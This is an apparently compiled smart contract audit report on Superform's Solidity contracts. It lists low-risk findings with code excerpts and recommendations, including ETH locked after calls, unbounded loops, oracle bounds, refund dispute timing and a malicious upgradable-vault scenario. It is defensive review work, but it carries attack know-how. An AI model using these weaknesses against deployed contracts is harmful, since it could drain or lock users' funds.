 When a contract function accepts Ethereum and executes a `.call()` or similar function that also forwards Ethereum value, it's important to check for and refund any remaining balance. This is because some of the supplied value may not be used during the call execution due to gas constraints, a revert in the called contract, or simply because not all the value was needed.

If you do not account for this remaining balance, it can become "locked" in the contract. It's crucial to either return the remaining balance to the sender or handle it in a way that ensures it is not permanently stuck. Neglecting to do so can lead to loss of funds and degradation of the contract's reliability. Furthermore, it's good practice to ensure fairness and trust with your users by returning unused funds. 

- Findings
 Findings are labeled with ' <= FOUND' 


<details><summary>Click to show findings</summary>


[LiquidityHandler.sol: 33-54](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/LiquidityHandler.sol#L33)
```javascript
33:     function _dispatchTokens(
34:         address bridge_,
35:         bytes memory txData_,
36:         address token_,
37:         uint256 amount_,
38:         uint256 nativeAmount_
39:     )
40:         internal
41:         virtual
42:     {
43:         if (bridge_ == address(0)) {
44:             revert Error.ZERO_ADDRESS();
45:         }
46: 
47:         if (token_ != NATIVE) {
48:             IERC20 token = IERC20(token_);
49:             token.safeIncreaseAllowance(bridge_, amount_);
50:         } else {
51:             if (nativeAmount_ < amount_) revert Error.INSUFFICIENT_NATIVE_AMOUNT();
52:         }
53: 
54:         (bool success,) = payable(bridge_).call{ value: nativeAmount_ }(txData_); // <= FOUND
55:         if (!success) revert Error.FAILED_TO_EXECUTE_TXDATA(token_);
56:     }

```


</details>



### Missing zero-address check

**Severity:** Low risk

**Context:** [ERC4626FormImplementation.sol#L401-L401](superform-core/src/forms/ERC4626FormImplementation.sol#L401-L401)

Checking for the zero address is a way to validate that a valid refund address is provided, preventing accidental transfers to the zero address.



### Unbounded state array which are iterated upon without a way to reduce their size can brick contact

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- [MEDIUM] Unbounded state array which are iterated upon
- Number of instances found
 2

- Resolution
 Reason: In Solidity, iteration over large arrays can lead to excessive gas consumption. In the worst case scenario, if the array size exceeds the block gas limit, it could make the operation unfeasible. This is a common problem for operations like token distribution, where one might iterate over an array of holders.

Resolution: To prevent gas problems, limit the size of arrays that will be iterated over. Implement an alternative data structure, such as a linked list, which allows for partial iteration. Another solution could be paginated processing, where elements are processed in smaller batches over multiple transactions. Lastly, the use of 'state array' with a separate index-tracking array can also help manage large datasets.

- Findings
 Findings are labeled with ' <= FOUND'


<details><summary>Click to show findings</summary>


BaseRouterImplementation.sol: 738-738
```javascript
738:     function _directMultiWithdraw(InitMultiVaultData memory vaultData_, address srcSender_) internal virtual { // <= FOUND
739:
740:         address[] memory superforms = DataLib.getSuperforms(vaultData_.superformIds);
741:         uint256 len = superforms.length;
742:
743:         for (uint256 i; i < len; ++i) {
744:
745:             _directWithdraw(
746:                 superforms[i], // <= FOUND
747:                 vaultData_.payloadId,
748:                 vaultData_.superformIds[i],
749:                 vaultData_.amounts[i],
750:                 vaultData_.maxSlippages[i],
751:                 vaultData_.liqData[i],
752:                 vaultData_.receiverAddress,
753:                 vaultData_.extraFormData,
754:                 srcSender_
755:             );
756:         }
757:     }

```

SuperformFactory.sol: 197-197
```javascript
197:     function createSuperform(
198:         uint32 formImplementationId_,
199:         address vault_
200:     )
201:         public
202:         override
203:         returns (uint256 superformId_, address superform_)
204:     {
205:         if (vault_ == address(0)) revert Error.ZERO_ADDRESS();
206:
207:         address tFormImplementation = formImplementation[formImplementationId_];
208:         if (tFormImplementation == address(0)) revert Error.FORM_DOES_NOT_EXIST();
209:
210:
211:         bytes32 vaultFormImplementationCombination = keccak256(abi.encode(tFormImplementation, vault_));
212:         if (vaultFormImplCombinationToSuperforms[vaultFormImplementationCombination] != 0) {
213:             revert Error.VAULT_FORM_IMPLEMENTATION_COMBINATION_EXISTS();
214:         }
215:
216:
217:         superform_ = tFormImplementation.cloneDeterministic(keccak256(abi.encode(uint256(CHAIN_ID), superformCounter)));
218:         ++superformCounter;
219:
220:         BaseForm(payable(superform_)).initialize(address(superRegistry), vault_, address(IERC4626(vault_).asset()));
221:
222:
223:         superformId_ = DataLib.packSuperform(superform_, formImplementationId_, CHAIN_ID);
224:
225:         vaultToSuperforms[vault_].push(superformId_);
226:
227:
228:         vaultToFormImplementationId[vault_].push(formImplementationId_);
229:
230:         vaultFormImplCombinationToSuperforms[vaultFormImplementationCombination] = superformId_;
231:
232:         superforms.push(superformId_);  // <= FOUND
233:         isSuperform[superformId_] = true;
234:
235:         emit SuperformCreated(formImplementationId_, vault_, superformId_, superform_);
236:     }

```


</details>



### Draft imports may break in new minor versions

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- [LOW] Draft imports may break in new minor versions
- Number of instances found
 1

- Resolution
 Utilizing draft contracts from OpenZeppelin, despite their audit, carries potential risks due to their 'draft' status. These contracts are based on non-finalized EIPs, potentially leading to unforeseen changes in even minor updates. In case a flaw surfaces in this OpenZeppelin version, and the necessary upgrade version introduces breaking changes, this could result in unexpected delays in developing and testing replacement contracts. To mitigate this, ensure comprehensive test coverage, enabling automated detection of differences, and establish a contingency plan for thoroughly testing a new version if changes occur. It may be advisable to create a forked file version instead of importing directly from the package, permitting manual updates to your fork as necessary.

- Findings
 Findings are labeled with ' <= FOUND'


<details><summary>Click to show findings</summary>


[ERC1155A.sol: 6-6](https://github.com/superform-xyz/ERC1155A/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L6)
```javascript
6: import { IERC1155Errors } from "openzeppelin-contracts/contracts/interfaces/draft-IERC6093.sol"; // <= FOUND

```


</details>



### Chainlink answer is not compared against min/max values

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- [LOW] Chainlink answer is not compared against min/max values
- Number of instances found
 1

- Resolution
 Chainlink oracle provides reliable, real-time data feeds to smart contracts. However, in order to enhance security and minimize the potential impact of an oracle failure or manipulation, it's a good practice to establish minimum and maximum thresholds for these data inputs. Without this safeguard, an erroneous or maliciously manipulated data point from the oracle could potentially lead to severe consequences in contract behavior. Therefore, the values retrieved from Chainlink's oracle should be cross-verified against preset min/max boundaries to ensure they fall within the expected range. This extra layer of validation adds robustness and reduces the risk of oracle-related issues.

- Findings
 Findings are labeled with ' <= FOUND'


<details><summary>Click to show findings</summary>


[PaymentHelper.sol: 830-830](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L830)
```javascript
830:     function _getGasPrice(uint64 chainId_) internal view returns (uint256) {
831:         address oracleAddr = address(gasPriceOracle[chainId_]);
832:         if (oracleAddr != address(0)) {
833:             (, int256 value,, uint256 updatedAt,) = AggregatorV3Interface(oracleAddr).latestRoundData();
834:             if (value <= 0) revert Error.CHAINLINK_MALFUNCTION();
835:             if (updatedAt == 0) revert Error.CHAINLINK_INCOMPLETE_ROUND();
836:             return uint256(value);
837:         }
838:
839:         return gasPrice[chainId_];
840:     }

```
[PaymentHelper.sol: 844-844](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L844)
```javascript
844:     function _getNativeTokenPrice(uint64 chainId_) internal view returns (uint256) {
845:         address oracleAddr = address(nativeFeedOracle[chainId_]);
846:         if (oracleAddr != address(0)) {
847:             (, int256 dstTokenPrice,, uint256 updatedAt,) = AggregatorV3Interface(oracleAddr).latestRoundData();
848:             if (dstTokenPrice <= 0) revert Error.CHAINLINK_MALFUNCTION();
849:             if (updatedAt == 0) revert Error.CHAINLINK_INCOMPLETE_ROUND();
850:             return uint256(dstTokenPrice);
851:         }
852:
853:         return nativePrice[chainId_];
854:     }

```


</details>




### Should expose the proposed time in function getFailedDeposits 

**Severity:** Low risk

**Context:** [CoreStateRegistry.sol#L68-L76](superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol#L68-L76)

in the function getFailedDeposits

```solidity
function getFailedDeposits(uint256 payloadId_)
	external
	view
	override
	returns (uint256[] memory superformIds, uint256[] memory amounts)
{
	superformIds = failedDeposits[payloadId_].superformIds;
	amounts = failedDeposits[payloadId_].amounts;
}
```

the function should also expose failed deposit proposed time to inform external integration the proposed time and whether the failed deposit is ready for rescue or dispute



### change of delay can impact live refund dispute or finalization

**Severity:** Low risk

**Context:** [CoreStateRegistry.sol#L253-L261](superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol#L253-L261)

- change of delay can impact live refund dispute or finalization

```
/// @dev the timelock is already elapsed to dispute
if (
	failedDeposits_.lastProposedTimestamp == 0
		|| block.timestamp > failedDeposits_.lastProposedTimestamp + _getDelay()
) {
	revert Error.DISPUTE_TIME_ELAPSED();
}
```

after the refund amount is proposed, within the delay timelock, the refund receiver can dispute the refund

after the delay timelock, anyone can finalize the refund

however, admin can change the delay time any time

for example,

a fund receiver expect he has 24 hours to dispute the refund

after 5 hours passes, the refund receiver realizes that the refund amount is inaccurate and wants to dispute the refund

then admin update delay to 1 hours

the dispute slot already passes and refund receiver cannot dispute the refund

recommendation is snapshot the delay configuration to make sure change of delay does not impact live failed deposit refund




### Inaccurate comments and mishandling of ERC20 token in pay master

**Severity:** Low risk

**Context:** [PayMaster.sol#L121-L124](superform-core/src/payments/PayMaster.sol#L121-L124)

- Inaccurate comments and mishandling of ERC20 token in pay master

there is a function

```
    function _forwardDustToPaymaster() internal override {
        _processForwardDustToPaymaster();
    }
```

which calls

```solidity
    function _processForwardDustToPaymaster() internal {
        address paymaster = superRegistry.getAddress(keccak256("PAYMASTER"));
        IERC20 token = IERC20(getVaultAsset());

        uint256 dust = token.balanceOf(address(this));
        if (dust != 0) {
            token.safeTransfer(paymaster, dust);
        }
    }
```

if there are left over asset in the form, anyone can sweep the token to pay master

but the comments in the paymaster _validateAndDispatchTokens suggests that paymaster is only used to  manage native token transfer

```solidity
    /// @dev helper to move native tokens cross-chain
    function _validateAndDispatchTokens(LiqRequest memory liqRequest_, address receiver_) internal {
```

while the admin can certain craft liqRequest to make sure the ERC20 token that are sweeped to pay master are transferred out

it is recommend to update the comment to highlight the pay master can handle ERC20 token transfer as well

there is a function on pay master

```solidity
    function withdrawTo(bytes32 superRegistryId_, uint256 nativeAmount_) external override onlyPaymentAdmin {
        if (nativeAmount_ > address(this).balance) {
            revert Error.FAILED_TO_SEND_NATIVE();
        }

        _withdrawNative(superRegistry.getAddress(superRegistryId_), nativeAmount_);
    }
```

but there is no function called withdraw ERC20 token

it is recommended to implement a function called withdrawERC20 token to withdraw ERC20 out of the pay master



### RetryPayload function in wormhole, layerzero and hyperlane AMB share the same function name but has different implementation

**Severity:** Low risk

**Context:** [LayerzeroImplementation.sol#L202-L202](superform-core/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L202-L202)

-  RetryPayload function in wormhole AMB, layerzero AMB and hyperlane AMB share the same function name but has different implementation

RetryPayload function in wormhole AMB, layerzero AMB and hyperlane AMB share the same function name but has different implementation

In wormhole AMB, in the function retryPayload, we are [resending the same payload again](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L152) to from source chain to destination

> [Requests a previously published delivery instruction to be redelivered](https://github.com/wormhole-foundation/wormhole-solidity-sdk/blob/bacbe82e6ae3f7f5ec7cdcd7d480f1e528471bbb/src/interfaces/IWormholeRelayer.sol#L392)

In layerzero AMB, we are retrying a failed payload in destination chain

the failed payload is [stored in layerzero endpoint](https://github.com/LayerZero-Labs/LayerZero/blob/48c21c3921931798184367fc02d3a8132b041942/contracts/Endpoint.sol#L127) and we are trying the payload by calling lzReceive

```solidity
    function retryPayload(uint16 _srcChainId, bytes calldata _srcAddress, bytes calldata _payload) external override receiveNonReentrant {
        StoredPayload storage sp = storedPayload[_srcChainId][_srcAddress];
        require(sp.payloadHash != bytes32(0), "LayerZero: no stored payload");
        require(_payload.length == sp.payloadLength && keccak256(_payload) == sp.payloadHash, "LayerZero: invalid payload");

        address dstAddress = sp.dstAddress;
        // empty the storedPayload
        sp.payloadLength = 0;
        sp.dstAddress = address(0);
        sp.payloadHash = bytes32(0);

        uint64 nonce = inboundNonce[_srcChainId][_srcAddress];

        ILayerZeroReceiver(dstAddress).lzReceive(_srcChainId, _srcAddress, nonce, _payload);
        emit PayloadCleared(_srcChainId, _srcAddress, nonce, dstAddress);
    }
```

also, in layerzero retry payload, there is no need to attach ETH even the retryPayload in layerzero AMB is payable, so recommend validate msg.value == 0

In hyperlane AMB, retrying payload is just [increase the gas payment](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L146) for message in source chain

```solidity
    function retryPayload(bytes memory data_) external payable override {
        (bytes32 messageId, uint32 destinationDomain, uint256 gasAmount) = abi.decode(data_, (bytes32, uint32, uint256));
        igp.payForGas{ value: msg.value }(messageId, destinationDomain, gasAmount, msg.sender);
    }
```

the protocol should really highlight  and docuemnts that even the function retryPayload shares the name in these 3 AMBs, the underhood implementation are completely different for developers and users.



### try catch a invalid smart contract with no code size can revert directly instead of hit catch block

**Severity:** Low risk

**Context:** [CoreStateRegistry.sol#L568-L586](superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol#L568-L586)

- try catch a invalid smart contract with no code size can revert directly instead of hit catch block

```
                address asset;
                try IBaseForm(_getSuperform(superformId_)).getVaultAsset() returns (address asset_) {
                    asset = asset_;
                } catch {
                    /// @dev if its error, we just consider asset as zero address
                }
                /// @dev if superform is invalid, try catch will fail and asset pushed is address (0)
                /// @notice this means that if a user tries to game the protocol with an invalid superformId, the funds
                /// bridged over that failed will be stuck here
                failedDeposits[payloadId_].settlementToken.push(asset);
                failedDeposits[payloadId_].settleFromDstSwapper.push(false);

                /// @dev sets amount to zero and will mark the payload as PROCESSED (overriding the previous memory
                /// settings)
                amount_ = 0;
                finalState_ = PayloadState.PROCESSED;
```

as the comments suggests

>          try IBaseForm(_getSuperform(superformId_)).getVaultAsset() returns (address asset_) {
                    asset = asset_;
                } catch {
                    /// @dev if its error, we just consider asset as zero address
                }
				
However, if we are calling the function getVaultAsset() in a invalid address that is not a smart contract address

transaction revert directly instead of hitting the catch block

https://github.com/ethereum/solidity/issues/12204

> Currently, a high-level call C.f(...) does an extcodesize check before the call and reverts if the address has empty code

recommend validate the superform id before start processing the transaction



### Gas estimation is not accurate when emergency withdraw flow is activated

**Severity:** Low risk

**Context:** [PaymentHelper.sol#L155-L166](superform-core/src/payments/PaymentHelper.sol#L155-L166)

**Description**

when estimate the execution gas cost in PaymentHelper

> step 1: estimate amb costs
> step 2: estimate update cost (only for deposit)
> Step 3: estimation processing cost of acknowledgement
>  step 4: estimate liq amount
>  step 5: estimate dst swap cost if it exists
>  step 6: estimate execution costs in dst (withdraw / deposit)
>  step 7: estimate if timelock form processing costs are involved
>  step 8: convert all dst gas estimates to src chain estimate  (withdraw / deposit)

However, when the form is paused,

the emergency withdraw will be executed

the estimation does not consider the gas amount for emergency withdraw

in fact, when executing emergency withdrwaw, the gas estimation for  estimation processing cost of acknowledgement and estimate liq amount and estimate dst swap cost if it exists and estimate execution costs in dst (withdraw / deposit) is no longer necessary

**Recommendation**

when the deposit (form) is paused, estimate the gas price in a different way and only consider the gas cost for emergency withdraw proecssing



### `SuperformRouter` user interacting functions don't enforce payment

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `SuperformRouter` contract represents the interfacing contracts where the user can interact with the protocol by depositing and withdrawing on the same chain or across chains, and all these functions are `payable` which indicates that the user must pay a fee for the protocol and relayers to execute cross-chain operations.

- But it was noticed that users are not enforced to pay for any operation as there's no check on the sent `msg.value` being > 0 or > minimum fee amount.

- Recommendation

Enforce a minimum fee amount to be paid by the users on these operations.



### Malicious emergency role could freeze all the deposits

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
if the emergency role decides to put a superform in emergency mode, and some users want to withdraw, their shares will be definitely burnt and  withdraws queued. if the emergency role doesnt process the withdraw the users will never get their funds.

**Recommendation**: 
Allow anyone to call `executeQueuedWithdrawal` in case the keeper doesn't call it. The queued withdrawal is assumed to be correct because it's generated by the `BaseForm` contract.



### The router allows to mint 0 shares on deposit

**Severity:** Low risk

**Context:** [BaseRouterImplementation.sol#L574-L574](superform-core/src/BaseRouterImplementation.sol#L574-L574)

**Description**:
A user can deposit in a vault that mints 0 shares and the transaction would still go through. _ERC4626_ is meant to revert when shares are 0, but a different implementation could not revert. This could result in the user losing his funds since he will not be able to withdraw anything with 0 shares.

**Recommendation**:
Revert if no shares are minted in any deposit.



### Upgradable vault admin can attack Superform users by changing the implementation of any vault underlying an existing superform

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Context**

[BaseForm.sol](https://github.com/superform-xyz/superform-core/blob/main/src/BaseForm.sol), [SuperformRouter.sol](https://github.com/superform-xyz/superform-core/blob/main/src/SuperformRouter.sol)

**Description**

Because there is no explicit handling of upgradable vaults in any of the existing form implementations, any vault could update its logic to harm Superform users at any time.

Although this should be a consideration for any user of an ERC4626 vault whether or not the Superform protocol is involved, Superform will connect users with risky vaults and abstract the implementations away from them, making it far easier for users to call updated contracts without realizing it. Consequently, it would make sense for Superform to prevent this kind of attack when it can.

**Proof of concept**

[This test](https://gist.github.com/ethanbennett/4a7bd856695a38d6e46eb5d52061b824) illustrates a scenario where a user successfully deposits into a vault by way of its superform. The vault admin then updates the vault's implementation, so when the user tries to make another deposit, their Dai is now sent straight to the attacker — despite calling the same superform in exactly the same way.

Note that this is not meant to be a realistic design for an upgradable vault, but to simulate a subset of its behavior from the perspective of Superform users. Likewise, a malicious vault implementation could execute higher-impact attacks, such as, for example, draining the entire contract after letting deposits accrue. This is, however, an immediately demonstrable impact in the context of a unit test.

**Recommendation**

Proxy detection may be difficult on-chain, but it is a perfect role for an additional keeper. Assuming such off-chain keepers exist, the contracts would benefit from:

- A `bool` for each superform specifying whether or not the underlying vault is upgradable (or is a proxy)
	- This can be set by the proxy keeper
- The ability to pause individual superforms
	- If centralization risk is a concern, this functionality could be restricted to superforms flagged by the proxy keeper
- An adapter for superforms flagged by the proxy keeper that checks for implementation changes in the underlying vault before depositing or withdrawing
	- If it finds changes, it could temporarily pause the superform
	- The protocol for unpausing depends on how opinionated the design aims to be: it could require admin review, it could require that a quorum of unique addresses request unpausing, or it could even bypass pausing entirely and simply trigger a warning for users who interact with the vault
	- See MakerDAO's [GemJoin6](https://github.com/makerdao/dss-deploy/blob/7394f6555daf5747686a1b29b2f46c6b2c64b061/src/join.sol#L321), a similar adapter for upgradable ERC20 tokens 
- A check for the proxy `bool` when a specific superform is first referenced in the router, and a call to the proxy adapter if necessary, before continuing with deposit or withdrawal logic



### Array lengths not checked

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_


*Instances (8)*:

```solidity
File: ERC1155A/src/ERC1155A.sol

207:     function setApprovalForMany(address spender, uint256[] memory ids, uint256[] memory amounts) public virtual {

216:     function increaseAllowanceForMany(
217:             address spender,
218:             uint256[] memory ids,
219:             uint256[] memory addedValues
220:         )
221:             public
222:             virtual
223:             returns (bool)
224:         {

236:     function decreaseAllowanceForMany(
237:             address spender,
238:             uint256[] memory ids,
239:             uint256[] memory subtractedValues
240:         )
241:             public
242:             virtual
243:             returns (bool)
244:         {

270:     function transmuteBatchToERC20(address owner, uint256[] memory ids, uint256[] memory amounts) external override {

285:     function transmuteBatchToERC1155A(
286:             address owner,
287:             uint256[] memory ids,
288:             uint256[] memory amounts
289:         )
290:             external
291:             override
292:         {

```

[207](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L207), [216-224](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L216-L224), [236-244](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L236-L244), [270](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L270), [285-292](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L285-L292)

```solidity
File: superform-core/src/crosschain-liquidity/DstSwapper.sol

161:     function batchProcessTx(
162:             uint256 payloadId_,
163:             uint256[] calldata indices,
164:             uint8[] calldata bridgeIds_,
165:             bytes[] calldata txData_
166:         )
167:             external
168:             override
169:             onlySwapper
170:             nonReentrant
171:         {

219:     function batchUpdateFailedTx(
220:             uint256 payloadId_,
221:             uint256[] calldata indices_,
222:             address[] calldata interimTokens_,
223:             uint256[] calldata amounts_
224:         )
225:             external
226:             override
227:             onlySwapper
228:         {

```

[161-171](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L161-L171), [219-228](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L219-L228)

```solidity
File: superform-core/src/payments/PaymentHelper.sol

401:     function estimateAMBFees(
402:             uint8[] memory ambIds_,
403:             uint64 dstChainId_,
404:             bytes memory message_,
405:             bytes[] memory extraData_
406:         )
407:             public
408:             view
409:             returns (uint256 totalFees, uint256[] memory)
410:         {

```

[401-410](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L401-L410)



### Large transfers may not work with some `ERC20` tokens

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Some `IERC20` implementations (e.g `UNI`, `COMP`) may fail if the valued transferred is larger than `uint96`. [Source](https://github.com/d-xo/weird-erc20#revert-on-large-approvals--transfers)

*Instances (4)*:

```solidity
File: superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol

305:                 IERC20(failedDeposits_.settlementToken[i]).safeTransfer(
306:                         failedDeposits_.refundAddress, failedDeposits_.amounts[i]
307:                     );

```

[305-307](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L305-L307)

```solidity
File: superform-core/src/crosschain-liquidity/DstSwapper.sol

259:             IERC20(interimToken_).safeTransfer(user_, amount_);

```

[259](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L259)

```solidity
File: superform-core/src/forms/ERC4626FormImplementation.sol

408:         vaultContract.safeTransfer(refundAddress_, amount_);

418:             token.safeTransfer(paymaster, dust);

```

[408](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L408), [418](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L418)



### External calls in an un-bounded `for`-loop may result in a DOS

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Consider limiting the number of iterations in `for`-loops that make external calls

*Instances (2)*:

```solidity
File: superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol

/// @audit safeTransfer()
298:         for (uint256 i; i < len; ++i) {
299:                 /// @dev refunds the amount to user specified refund address
300:                 if (failedDeposits_.settleFromDstSwapper[i]) {
301:                     dstSwapper.processFailedTx(
302:                         failedDeposits_.refundAddress, failedDeposits_.settlementToken[i], failedDeposits_.amounts[i]
303:                     );
304:                 } else {
305:                     IERC20(failedDeposits_.settlementToken[i]).safeTransfer(
306:                         failedDeposits_.refundAddress, failedDeposits_.amounts[i]
307:                     );
308:                 }
309:             }

/// @audit safeTransfer()
298:         for (uint256 i; i < len; ++i) {
299:                 /// @dev refunds the amount to user specified refund address
300:                 if (failedDeposits_.settleFromDstSwapper[i]) {
301:                     dstSwapper.processFailedTx(
302:                         failedDeposits_.refundAddress, failedDeposits_.settlementToken[i], failedDeposits_.amounts[i]
303:                     );
304:                 } else {
305:                     IERC20(failedDeposits_.settlementToken[i]).safeTransfer(
306:                         failedDeposits_.refundAddress, failedDeposits_.amounts[i]
307:                     );
308:                 }
309:             }

```

[298-309](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L298-L309), [298-309](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L298-L309)



### For loops in `public` or `external` functions should be avoided due to high gas costs and possible DOS

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

In Solidity, for loops can potentially cause Denial of Service (DoS) attacks if not handled carefully. DoS attacks can occur when an attacker intentionally exploits the gas cost of a function, causing it to run out of gas or making it too expensive for other users to call. Below are some scenarios where for loops can lead to DoS attacks: Nested for loops can become exceptionally gas expensive and should be used sparingly.

*Instances (25)*:

```solidity
File: ERC1155A/src/ERC1155A.sol

/// @audit on line 137
112:     function safeBatchTransferFrom(
113:             address from,
114:             address to,
115:             uint256[] calldata ids,
116:             uint256[] calldata amounts,
117:             bytes calldata data
118:         )
119:             public
120:             virtual
121:             override
122:         {
123:             bool singleApproval;
124:             uint256 len = ids.length;
125:     
126:             if (len != amounts.length) revert LENGTH_MISMATCH();
127:     
128:             /// @dev case to handle single id / multi id approvals
129:             if (msg.sender != from && !isApprovedForAll[from][msg.sender]) {
130:                 singleApproval = true;
131:             }
132:     
133:             // Storing these outside the loop saves ~15 gas per iteration.
134:             uint256 id;
135:             uint256 amount;
136:     
137:             for (uint256 i; i < len; ++i) {
138:                 id = ids[i];
139:                 amount = amounts[i];
140:     
141:                 if (singleApproval) {
142:                     if (allowance(from, msg.sender, id) < amount) revert NOT_ENOUGH_ALLOWANCE();
143:                     allowances[from][to][id] -= amount;
144:                 }
145:     
146:                 balanceOf[from][id] -= amount;
147:                 balanceOf[to][id] += amount;
148:             }
149:     
150:             emit TransferBatch(msg.sender, from, to, ids, amounts);
151:     
152:             _doSafeBatchTransferAcceptanceCheck(msg.sender, from, to, ids, amounts, data);
153:         }

/// @audit on line 169
156:     function balanceOfBatch(
157:             address[] calldata owners,
158:             uint256[] calldata ids
159:         )
160:             public
161:             view
162:             virtual
163:             returns (uint256[] memory balances)
164:         {
165:             if (owners.length != ids.length) revert LENGTH_MISMATCH();
166:     
167:             balances = new uint256[](owners.length);
168:     
169:             for (uint256 i = 0; i < owners.length; ++i) {
170:                 balances[i] = balanceOf[owners[i]][ids[i]];
171:             }
172:         }

/// @audit on line 210
207:     function setApprovalForMany(address spender, uint256[] memory ids, uint256[] memory amounts) public virtual {
208:             address owner = msg.sender;
209:     
210:             for (uint256 i; i < ids.length; ++i) {
211:                 _setApprovalForOne(owner, spender, ids[i], amounts[i]);
212:             }
213:         }

/// @audit on line 227
216:     function increaseAllowanceForMany(
217:             address spender,
218:             uint256[] memory ids,
219:             uint256[] memory addedValues
220:         )
221:             public
222:             virtual
223:             returns (bool)
224:         {
225:             address owner = msg.sender;
226:             uint256 id;
227:             for (uint256 i; i < ids.length; ++i) {
228:                 id = ids[i];
229:                 _setApprovalForOne(owner, spender, id, allowance(owner, spender, id) + addedValues[i]);
230:             }
231:     
232:             return true;
233:         }

/// @audit on line 247
236:     function decreaseAllowanceForMany(
237:             address spender,
238:             uint256[] memory ids,
239:             uint256[] memory subtractedValues
240:         )
241:             public
242:             virtual
243:             returns (bool)
244:         {
245:             address owner = msg.sender;
246:     
247:             for (uint256 i; i < ids.length; ++i) {
248:                 _decreaseAllowance(owner, spender, ids[i], subtractedValues[i]);
249:             }
250:     
251:             return true;
252:         }

/// @audit on line 274
270:     function transmuteBatchToERC20(address owner, uint256[] memory ids, uint256[] memory amounts) external override {
271:             /// @dev an approval is needed to burn
272:             _batchBurn(owner, msg.sender, ids, amounts);
273:     
274:             for (uint256 i = 0; i < ids.length; ++i) {
275:                 address aERC20Token = aErc20TokenId[ids[i]];
276:                 if (aERC20Token == address(0)) revert AERC20_NOT_REGISTERED();
277:     
278:                 IaERC20(aERC20Token).mint(owner, amounts[i]);
279:             }
280:     
281:             emit TransmutedBatchToERC20(owner, ids, amounts);
282:         }

/// @audit on line 293
285:     function transmuteBatchToERC1155A(
286:             address owner,
287:             uint256[] memory ids,
288:             uint256[] memory amounts
289:         )
290:             external
291:             override
292:         {
293:             for (uint256 i = 0; i < ids.length; ++i) {
294:                 address aERC20Token = aErc20TokenId[ids[i]];
295:                 if (aERC20Token == address(0)) revert AERC20_NOT_REGISTERED();
296:                 /// @dev an approval is needed on each aERC20 to burn
297:                 IaERC20(aERC20Token).burn(owner, msg.sender, amounts[i]);
298:             }
299:     
300:             _batchMint(owner, msg.sender, ids, amounts, bytes(""));
301:     
302:             emit TransmutedBatchToERC1155A(owner, ids, amounts);
303:         }

```

